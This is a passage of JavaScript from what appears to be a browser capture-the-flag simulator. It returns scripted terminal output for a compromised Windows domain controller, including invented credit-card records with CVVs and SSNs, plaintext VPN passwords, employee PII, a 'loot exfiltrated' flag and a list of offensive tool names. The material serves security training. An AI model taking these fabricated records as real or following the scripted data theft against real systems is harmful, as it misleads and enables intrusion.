      { t: 'SeDebugPrivilege                Debug programs                      Enabled', cls: 'g' },
      { t: 'SeImpersonatePrivilege          Impersonate a client after auth     Enabled', cls: 'g' },
    ]};
    if (cmd === 'hostname') return { lines: [{ t: 'DC01' }] };
    if (cmd === 'ipconfig' || cmd === 'ipconfig /all') return { lines: [
      { t: 'Windows IP Configuration' }, { t: '' },
      { t: 'Ethernet adapter Ethernet0:', cls: 'b' },
      { t: '   Connection-specific DNS Suffix  . : corp.local' },
      { t: '   IPv4 Address. . . . . . . . . . . : 10.10.10.10' },
      { t: '   Subnet Mask . . . . . . . . . . . : 255.255.255.0' },
      { t: '   Default Gateway . . . . . . . . . : 10.10.10.1' },
    ]};
    if (/^net user/.test(cmd)) return { lines: [
      { t: 'User accounts for \\\\DC01', cls: 'b' },
      { t: '-------------------------------------------------------------------------------' },
      { t: 'Administrator            Guest                    krbtgt' },
      { t: 'john.doe                 svc_backup               svc_sql                svc_web' },
    ]};
    if (/^net localgroup/.test(cmd)) return { lines: [
      { t: 'Aliases for \\\\DC01', cls: 'b' },
      { t: '-------------------------------------------------------------------------------' },
      { t: '*Administrators          *Backup Operators        *Domain Admins' },
      { t: '*Domain Users            *Remote Desktop Users' },
    ]};
    // ── CORP_DATA loot ──────────────────────────────────────────────────────
    if (/^dir\s+C:\\CORP_DATA\s*$/i.test(cmd)) return { lines: [
      { t: ' Volume in drive C has no label.  Volume Serial Number is 1337-D34D' },
      { t: '' },
      { t: ' Directory of C:\\CORP_DATA', cls: 'b' }, { t: '' },
      { t: '01/15/2024  09:12 AM    <DIR>          .' },
      { t: '01/15/2024  09:12 AM    <DIR>          ..' },
      { t: '12/31/2023  11:59 PM    <DIR>          Finance', cls: 'y' },
      { t: '01/01/2024  12:00 AM    <DIR>          HR', cls: 'y' },
      { t: '01/12/2024  03:22 PM    <DIR>          Customer', cls: 'r' },
      { t: '01/13/2024  02:11 PM    <DIR>          IT', cls: 'y' },
      { t: '               0 File(s)              0 bytes' },
      { t: '               4 Dir(s)  32,456,789,120 bytes free' },
    ]};
    if (/^dir\s+C:\\CORP_DATA\\Finance/i.test(cmd)) return { lines: [
      { t: ' Directory of C:\\CORP_DATA\\Finance', cls: 'b' }, { t: '' },
      { t: '12/31/2023  11:59 PM     2,349,012     Q4_2023_Revenue_Final.xlsx', cls: 'y' },
      { t: '12/31/2023  11:59 PM       982,034     Annual_Budget_2024.xlsx', cls: 'y' },
      { t: '01/10/2024  08:45 AM       450,123     Payroll_Jan2024.xlsx', cls: 'y' },
      { t: '               3 File(s)      3,781,169 bytes' },
    ]};
    if (/^dir\s+C:\\CORP_DATA\\HR/i.test(cmd)) return { lines: [
      { t: ' Directory of C:\\CORP_DATA\\HR', cls: 'b' }, { t: '' },
      { t: '01/01/2024  12:00 AM    12,492,048     All_Employees_PII.csv', cls: 'r' },
      { t: '01/01/2024  12:00 AM       823,440     Salary_Database_2024.xlsx', cls: 'r' },
      { t: '               2 File(s)     13,315,488 bytes' },
    ]};
    if (/^dir\s+C:\\CORP_DATA\\Customer/i.test(cmd)) return { lines: [
      { t: ' Directory of C:\\CORP_DATA\\Customer', cls: 'b' }, { t: '' },
      { t: '01/12/2024  03:22 PM    89,234,502     Credit_Card_Database.csv', cls: 'r' },
      { t: '01/14/2024  11:30 AM     4,128,903     Loyalty_Members.csv', cls: 'y' },
      { t: '               2 File(s)     93,363,405 bytes' },
    ]};
    if (/^dir\s+C:\\CORP_DATA\\IT/i.test(cmd)) return { lines: [
      { t: ' Directory of C:\\CORP_DATA\\IT', cls: 'b' }, { t: '' },
      { t: '12/20/2023  04:15 PM         4,832     VPN_Credentials.txt', cls: 'r' },
      { t: '01/05/2024  10:22 AM        32,840     Network_Diagram.vsdx', cls: 'y' },
      { t: '01/13/2024  02:11 PM       128,934     Backup_Schedule.xlsx', cls: 'y' },
      { t: '               3 File(s)        166,606 bytes' },
    ]};
    if (/type.*Credit_Card_Database/i.test(cmd)) {
      SIM.lootExfiltrated = true;
      return { id: 'loot-exfil', lines: [
        { t: 'CustomerID,FirstName,LastName,Email,CardNumber,CVV,ExpDate,SSN', cls: 'b' },
        { t: '10001,James,Wilson,j.wilson@email.com,4532-1234-5678-9012,341,03/27,123-45-6789', cls: 'g' },
        { t: '10002,Sarah,Chen,s.chen@email.com,5412-7534-1234-5678,229,08/25,234-56-7890', cls: 'g' },
        { t: '10003,Robert,Martinez,r.martinez@email.com,4916-8765-4321-0987,512,12/26,345-67-8901', cls: 'g' },
        { t: '10004,Emily,Johnson,e.johnson@email.com,3782-822463-10005,091,06/28,456-78-9012', cls: 'g' },
        { t: '10005,David,Kim,d.kim@email.com,6011-9876-5432-1098,774,11/25,567-89-0123', cls: 'g' },
        { t: '...', cls: 'd' },
        { t: '[23,452 records total — Credit_Card_Database.csv  (89.2 MB)]', cls: 'y' },
        { t: '' },
        { t: '*** SENSITIVE: PCI-DSS PROTECTED DATA — UNAUTHORIZED ACCESS IS A FEDERAL CRIME ***', cls: 'r' },
      ]};
    }
    if (/type.*VPN_Credentials/i.test(cmd)) return { lines: [
      { t: '# VPN Gateway Credentials — CONFIDENTIAL' }, { t: '' },
      { t: 'Gateway: vpn.corp.local:443', cls: 'b' },
      { t: 'admin_vpn     : VPNAdmin2024!', cls: 'g' },
      { t: 'backup_vpn    : Backup@Remote#99', cls: 'g' },
      { t: 'emergency_vpn : Em3rg3ncy!2024', cls: 'g' },
    ]};
    if (/type.*All_Employees_PII/i.test(cmd)) return { lines: [
      { t: 'EmployeeID,Name,SSN,DOB,Salary,Department', cls: 'b' },
      { t: '1001,John Doe,123-45-6789,1985-03-15,$85000,IT', cls: 'g' },
      { t: '1002,Jane Smith,234-56-7890,1979-07-22,$120000,Management', cls: 'g' },
      { t: '1003,Robert Brown,345-67-8901,1990-11-08,$72000,Finance', cls: 'g' },
      { t: '...', cls: 'd' },
      { t: '[3,842 employee records — All_Employees_PII.csv  (12.4 MB)]', cls: 'y' },
    ]};
    // ── Generic dir / type fallbacks ────────────────────────────────────────
    if (cmd.startsWith('dir')) return { lines: [
      { t: ' Volume in drive C has no label.' },
      { t: ' Directory of C:\\Windows\\system32' }, { t: '' },
      { t: '01/15/2024  02:23 PM    <DIR>          .' },
      { t: '01/15/2024  02:23 PM    <DIR>          ..' },
      { t: '01/15/2024  02:23 PM    <DIR>          config' },
      { t: '01/15/2024  02:23 PM        32,768     cmd.exe' },
    ]};
    if (cmd.startsWith('type')) return { lines: [
      { t: `The system cannot find the file specified: ${cmd.replace(/^type\s+/,'')}`, cls: 'r' },
    ]};
    if (cmd === 'cls') return { clear: true };
    return { lines: [{ t: `'${cmd.split(' ')[0]}' is not recognized as an internal or external command.`, cls: 'r' }] };
  }

  if (cmd === 'clear') return { clear: true };
  if (cmd === 'reset') {
    SIM.cwd = '/home/kali';
    SIM.user = 'kali';
    SIM.windowsShell = false;
    SIM.hashesOnDisk = false;
    SIM.lootExfiltrated = false;
    if (typeof CTF !== 'undefined') CTF._reset?.();
    return { clear: true };
  }
  if (cmd === 'exit' || cmd === 'logout') return { lines: [{ t: 'Type exit in your browser to close the tab.', cls: 'd' }] };

  // Walk handlers in order, first match wins
  for (const h of HANDLERS) {
    if (h.match(cmd)) {
      if (h.waitSudo) {
        return { waitSudo: true, pendingCmd: cmd.replace(/^sudo\s*/, '') };
      }
      if (h.requireRoot && !isRoot()) {
        return { lines: [{ t: `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?\nHint: try  sudo ${cmd}`, cls: 'r' }] };
      }
      if (h.after) h.after(cmd);
      const event = typeof h.event === 'function' ? h.event(cmd) : h.event;
      const lines = h.lines.map(l => ({
        t: typeof l.t === 'function' ? l.t(cmd) : l.t,
        cls: typeof l.cls === 'function' ? l.cls(cmd) : (l.cls || ''),
      }));
      const loadTime = typeof h.loadTime === 'function' ? h.loadTime(cmd) : (h.loadTime || 0);
      return { id: h.id || null, lines, event, loadTime, progressFn: h.progressFn || null,
               liveDisplay: h.liveDisplay || false, displayFn: h.displayFn || null, refreshMs: h.refreshMs || 2000 };
    }
  }

  // Unknown command
  const tool = cmd.split(' ')[0];
  const knownTools = ['nmap','enum4linux','crackmapexec','cme','impacket','john','hashcat',
    'hydra','kerbrute','gobuster','rpcclient','smbclient','metasploit','msfconsole','wpscan','nikto'];
  if (knownTools.some(t => tool.includes(t))) {
    return { lines: [{ t: `${tool}: unrecognized options or target. Check syntax — type  help  for the CTF steps.`, cls: 'r' }] };
  }
  return { lines: [{ t: `bash: ${tool}: command not found`, cls: 'r' }] };
}
